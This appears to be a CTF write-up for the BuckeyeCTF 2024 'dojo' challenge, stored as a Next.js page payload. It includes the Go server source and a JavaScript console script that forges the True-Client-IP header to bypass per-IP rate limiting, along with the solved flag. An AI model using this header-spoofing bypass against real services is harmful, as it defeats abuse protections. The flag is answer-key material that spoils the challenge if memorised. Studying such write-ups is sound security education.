@@ -1,0 +1,364 @@
+1:"$Sreact.fragment"
+2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
+1a:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
+1b:"$Sreact.suspense"
+:HL["https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb","image"]
+:HL["https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019","image"]
+3:T1f20,package server
+
+import (
+	"encoding/json"
+	"math/rand/v2"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
+
+	"github.com/go-chi/chi/v5"
+	"github.com/go-chi/chi/v5/middleware"
+	"github.com/go-chi/httprate"
+	"github.com/go-chi/jwtauth/v5"
+	"github.com/gorilla/websocket"
+)
+
+var TokenAuth *jwtauth.JWTAuth
+
+const MaxBossHealth = 1000
+
+type GameState struct {
+	id           int32
+	bossHealth   int32
+	playerHealth int32
+	plundered    int32
+	lastDodge    time.Time
+
+	conn *websocket.Conn
+}
+
+func (gs *GameState) SyncJSON() {
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]interface{}{
+			"action":       "sync",
+			"playerHealth": gs.playerHealth,
+			"bossHealth":   gs.bossHealth,
+		})
+	}
+
+	if gs.bossHealth <= 0 {
+		if gs.conn != nil {
+			gs.conn.WriteJSON(map[string]string{"action": "win"})
+
+			if gs.plundered > 800 {
+				flag, exists := os.LookupEnv("FLAG")
+				if !exists {
+					flag = "bctf{fake_flag}"
+				}
+				gs.conn.WriteJSON(map[string]string{"flag": flag})
+			}
+
+			gs.conn.Close()
+		}
+
+		delete(gameStates, gs.id)
+	}
+
+	if gs.playerHealth <= 0 {
+		if gs.conn != nil {
+			gs.conn.WriteJSON(map[string]string{"action": "lose", "reason": "died"})
+			gs.conn.Close()
+		}
+		delete(gameStates, gs.id)
+	}
+}
+
+func (gs *GameState) PlayerAttack() (success bool, amount int32) {
+	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
+		return false, 0
+	}
+
+	amt := int32(rand.IntN(12) + 2)
+
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]interface{}{"action": "player_attack", "amount": amt})
+	}
+
+	gs.bossHealth -= amt
+	gs.SyncJSON()
+	return true, amt
+}
+
+func (gs *GameState) PlayerDodge() {
+	gs.lastDodge = time.Now()
+}
+
+func (gs *GameState) PlayerPlunder() (bool, int32) {
+	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
+		return false, 0
+	}
+
+	amount := int32(rand.IntN(12) + 2)
+	gs.plundered += amount
+	return true, amount
+}
+
+func (gs *GameState) BossAttack(amount int32) {
+	if gs.lastDodge.Add(1 * time.Second).After(time.Now()) {
+		if gs.conn != nil {
+			gs.conn.WriteJSON(map[string]interface{}{"action": "dodged", "amount": amount})
+		}
+		return
+	}
+
+	gs.playerHealth -= amount
+
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]interface{}{"action": "boss_attack", "amount": amount})
+	}
+	gs.SyncJSON()
+}
+
+func (gs *GameState) BossSignalAttack() {
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]interface{}{"action": "signal"})
+	}
+}
+
+func (gs *GameState) BossHeal(amount int32) {
+	gs.bossHealth = min(gs.bossHealth+amount, MaxBossHealth)
+
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]interface{}{"action": "heal", "amount": amount})
+	}
+	gs.SyncJSON()
+}
+
+func (gs *GameState) TimeoutLose() {
+	if gs.conn != nil {
+		gs.conn.WriteJSON(map[string]string{"action": "lose", "reason": "timed out"})
+		gs.conn.Close()
+	}
+	delete(gameStates, gs.id)
+}
+
+var gameStates = make(map[int32]*GameState)
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+	CheckOrigin:     func(r *http.Request) bool { return os.Getenv("BF_PRODUCTION") != "true" },
+}
+
+func (s *Server) RegisterRoutes() http.Handler {
+	r := chi.NewRouter()
+	r.Use(middleware.Recoverer)
+	r.Get("/", s.FrontendHandler)
+	r.Get("/*", s.FrontendHandler)
+
+	r.Group(func(r chi.Router) {
+		r.Use(middleware.Logger)
+		r.Use(middleware.Timeout(time.Second * 60))
+		r.Use(httprate.LimitByRealIP(2, time.Second))
+		r.Get("/api/new", s.NewGameHandler)
+
+		r.Group(func(r chi.Router) {
+			r.Use(jwtauth.Verifier(TokenAuth))
+			r.Use(jwtauth.Authenticator(TokenAuth))
+
+			r.Get("/api/attack", s.AttackHandler)
+			r.Get("/api/dodge", s.DodgeHandler)
+			r.Get("/api/plunder", s.PlunderHandler)
+			r.Get("/api/ws", s.WebsocketHandler)
+		})
+	})
+
+	return r
+}
+
+func (s *Server) FrontendHandler(w http.ResponseWriter, r *http.Request) {
+	ext := filepath.Ext(r.URL.Path)
+
+	// If there is no file extension, and it does not end with a slash,
+	// assume it's an HTML file and append .html
+	if ext == "" && !strings.HasSuffix(r.URL.Path, "/") {
+		r.URL.Path += ".html"
+	}
+
+	http.FileServer(http.Dir("frontend/build")).ServeHTTP(w, r)
+}
+
+func (s *Server) AttackHandler(w http.ResponseWriter, r *http.Request) {
+	_, claims, _ := jwtauth.FromContext(r.Context())
+	game_id := int32(claims["game_id"].(float64))
+
+	gameState := gameStates[game_id]
+	if gameState == nil {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
+		return
+	}
+
+	success, amount := gameState.PlayerAttack()
+	if !success {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "You can't attack right now"})
+		return
+	}
+
+	json.NewEncoder(w).Encode(map[string]interface{}{"status": "success", "amount": amount})
+}
+
+func (s *Server) DodgeHandler(w http.ResponseWriter, r *http.Request) {
+	_, claims, _ := jwtauth.FromContext(r.Context())
+	game_id := int32(claims["game_id"].(float64))
+
+	gameState := gameStates[game_id]
+	if gameState == nil {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
+		return
+	}
+
+	gameState.PlayerDodge()
+
+	json.NewEncoder(w).Encode(map[string]interface{}{"status": "success"})
+}
+
+func (s *Server) PlunderHandler(w http.ResponseWriter, r *http.Request) {
+	_, claims, _ := jwtauth.FromContext(r.Context())
+	game_id := int32(claims["game_id"].(float64))
+
+	gameState := gameStates[game_id]
+	if gameState == nil {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
+		return
+	}
+
+	success, amount := gameState.PlayerPlunder()
+	if !success {
+		w.WriteHeader(http.StatusInternalServerError)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "You can't plunder right now"})
+		return
+	}
+
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"status": "success",
+		"amount": amount,
+		"total":  gameState.plundered,
+	})
+}
+
+func (s *Server) NewGameHandler(w http.ResponseWriter, r *http.Request) {
+	gameId := rand.Int32()
+	_, tokenString, _ := TokenAuth.Encode(map[string]interface{}{"game_id": gameId})
+
+	gameStates[gameId] = &GameState{
+		id:           gameId,
+		bossHealth:   MaxBossHealth,
+		playerHealth: 100,
+	}
+
+	cookie := http.Cookie{
+		Name:     "jwt",
+		Value:    tokenString,
+		HttpOnly: false,
+	}
+
+	http.SetCookie(w, &cookie)
+
+	go gameRunner(gameId)
+
+	http.Redirect(w, r, "/play", http.StatusTemporaryRedirect)
+}
+
+func gameRunner(gameId int32) {
+	s2 := rand.NewPCG(uint64(gameId), 1024)
+	r2 := rand.New(s2)
+
+	go func() {
+		time.Sleep(60 * time.Second)
+
+		gameState := gameStates[gameId]
+		if gameState == nil {
+			return
+		}
+
+		gameState.TimeoutLose()
+	}()
+
+	time.Sleep(3 * 1000 * time.Millisecond)
+
+	for {
+		time.Sleep(1000 * time.Millisecond)
+		gameState := gameStates[gameId]
+		if gameState == nil {
+			return
+		}
+
+		v := r2.IntN(100)
+
+		if v < 20 {
+			if gameState.bossHealth < MaxBossHealth*0.8 {
+				healAmount := int32(r2.IntN(50) + 20)
+				gameState.BossHeal(healAmount)
+			} else {
+				damageAmount := int32(r2.IntN(30) + 5)
+				gameState.BossAttack(damageAmount)
+			}
+		} else if v < 35 {
+			gameState.BossSignalAttack()
+			time.Sleep(1000 * time.Millisecond)
+			damageAmount := int32(r2.IntN(50) + 10)
+			gameState.BossAttack(damageAmount)
+		} else if v < 50 {
+			damageAmount := int32(r2.IntN(30) + 5)
+			gameState.BossAttack(damageAmount)
+		} else if v < 65 {
+			gameState.BossSignalAttack()
+		}
+	}
+}
+
+func (s *Server) WebsocketHandler(w http.ResponseWriter, r *http.Request) {
+	_, claims, _ := jwtauth.FromContext(r.Context())
+	gameId := int32(claims["game_id"].(float64))
+
+	gameState := gameStates[gameId]
+	if gameState == nil {
+		w.WriteHeader(http.StatusNotFound)
+		json.NewEncoder(w).Encode(map[string]interface{}{"status": "error", "message": "Game not found"})
+		return
+	}
+
+	conn, err := upgrader.Upgrade(w, r, nil)
+	if err != nil {
+		return
+	}
+
+	gameState.conn = conn
+	gameState.SyncJSON()
+}0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"BuckeyeCTF 2024 — dojo"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"The dojo stores many riches. Can you make it through the gauntlet?"}],"\n",["$","p","p-1",{"children":"dojo.challs.pwnoh.io"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given a Go server looking like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"go"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14"]}]}],["$L15","$L16","$L17","$L18"],"$L19"]}],"loading":null,"isPartial":false}
+4:["$","p","p-1",{"children":"Our goal is to plunder 800 emeralds, all while defeating the boss and not getting killed in the process."}]
+5:["$","p","p-2",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/1f28d421-8fe1-45a5-9271-4fad8c6897bb","alt":"image"}]}]
+6:["$","p","p-3",{"children":"Looking at the underlying logic for attacking, dodging, and plundering,"}]
+7:["$","$L2","pre-1",{"className":"my-2","children":"func (gs *GameState) PlayerAttack() (success bool, amount int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamt := int32(rand.IntN(12) + 2)\n\n\tif gs.conn != nil {\n\t\tgs.conn.WriteJSON(map[string]interface{}{\"action\": \"player_attack\", \"amount\": amt})\n\t}\n\n\tgs.bossHealth -= amt\n\tgs.SyncJSON()\n\treturn true, amt\n}\n\nfunc (gs *GameState) PlayerDodge() {\n\tgs.lastDodge = time.Now()\n}\n\nfunc (gs *GameState) PlayerPlunder() (bool, int32) {\n\tif gs.lastDodge.Add(1 * time.Second).After(time.Now()) {\n\t\treturn false, 0\n\t}\n\n\tamount := int32(rand.IntN(12) + 2)\n\tgs.plundered += amount\n\treturn true, amount\n}","language":"go"}]
+8:["$","p","p-4",{"children":"it seems like attacking and plundering are only prevented after dodging, and don't block the spam of each other. Then, a preliminary idea can be to just spam plunder until we reach 800 emeralds, then spam attack until we kill the boss."}]
+9:["$","p","p-5",{"children":"Unfortunately, referencing the route handler again,"}]
+a:["$","$L2","pre-2",{"className":"my-2","children":"\tr.Group(func(r chi.Router) {\n\t\tr.Use(middleware.Logger)\n\t\tr.Use(middleware.Timeout(time.Second * 60))\n\t\tr.Use(httprate.LimitByRealIP(2, time.Second))\n\t\tr.Get(\"/api/new\", s.NewGameHandler)","language":"go"}]
+b:["$","p","p-6",{"children":["it looks like our requests are ratelimited to 2 per second by ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"httprate.LimitByRealIP"}],"; naively spamming requests will return ",["$","code","code-1",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"429"}],"s and we'll still get defeated by the boss."]}]
+c:["$","p","p-7",{"children":["However, going to the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"httprate"}]," source code,"]}]
+d:["$","$L2","pre-3",{"className":"my-2","children":"func LimitByRealIP(requestLimit int, windowLength time.Duration) func(next http.Handler) http.Handler {\n\treturn Limit(requestLimit, windowLength, WithKeyFuncs(KeyByRealIP))\n}\n\nfunc Key(key string) func(r *http.Request) (string, error) {\n\treturn func(r *http.Request) (string, error) {\n\t\treturn key, nil\n\t}\n}\n\nfunc KeyByIP(r *http.Request) (string, error) {\n\tip, _, err := net.SplitHostPort(r.RemoteAddr)\n\tif err != nil {\n\t\tip = r.RemoteAddr\n\t}\n\treturn canonicalizeIP(ip), nil\n}\n\nfunc KeyByRealIP(r *http.Request) (string, error) {\n\tvar ip string\n\n\tif tcip := r.Header.Get(\"True-Client-IP\"); tcip != \"\" {\n\t\tip = tcip\n\t} else if xrip := r.Header.Get(\"X-Real-IP\"); xrip != \"\" {\n\t\tip = xrip\n\t} else if xff := r.Header.Get(\"X-Forwarded-For\"); xff != \"\" {\n\t\ti := strings.Index(xff, \", \")\n\t\tif i == -1 {\n\t\t\ti = len(xff)\n\t\t}\n\t\tip = xff[:i]\n\t} else {\n\t\tvar err error\n\t\tip, _, err = net.SplitHostPort(r.RemoteAddr)\n\t\tif err != nil {\n\t\t\tip = r.RemoteAddr\n\t\t}\n\t}\n\n\treturn canonicalizeIP(ip), nil\n}","language":"go"}]
+e:["$","p","p-8",{"children":["it looks like the way they check the client's real IP is through reading the ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"True-Client-IP"}]," header. If we forge this header, then, we should be able to bypass their rate limiting and get the flag."]}]
+f:["$","p","p-9",{"children":"Occasionally, forged fetches still fail for whatever reason. Still, assuming most fetches still go through, we can spam attacks and plunders with the following console script:"}]
+10:["$","$L2","pre-4",{"className":"my-2","children":"let i = 0;\nwhile (true) {\n    try {\n        const { total } = await (await fetch('/api/plunder', {\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\n        })).json();\n        if (total > 800) break;\n    } catch {}\n}\n\nlet health = 2000;\nwhile (health >= 0) {\n    try {\n        const { amount } = await (await fetch('/api/attack', {\n            headers: { 'True-Client-IP': `${i}.${i}.${i}.${i++}` }\n        })).json();\n        health -= amount;\n    } catch {}\n}","language":"js"}]
+11:["$","p","p-10",{"children":["$","a","a-0",{"href":"https://gist.github.com/user-attachments/assets/f70ea636-2fe1-4ace-a8d2-204aac7b2f85","children":"dojo.webm"}]}]
+12:["$","p","p-11",{"children":"Once we've won, all we need to do is check the websocket to get the flag:"}]
+13:["$","p","p-12",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/c53bedee-58cf-47c3-9f7a-acecaa9c7019","alt":"image"}]}]
+14:["$","$L2","pre-5",{"className":"my-2","children":"bctf{D3FAul7_rA73_l1m17_fUnc710N5_aR3_5caRy}"}]
+15:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
+16:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
+17:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
+18:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
+19:["$","$L1a",null,{"children":["$","$1b",null,{"name":"Next.MetadataOutlet","children":"$@1c"}]}]
+1c:null
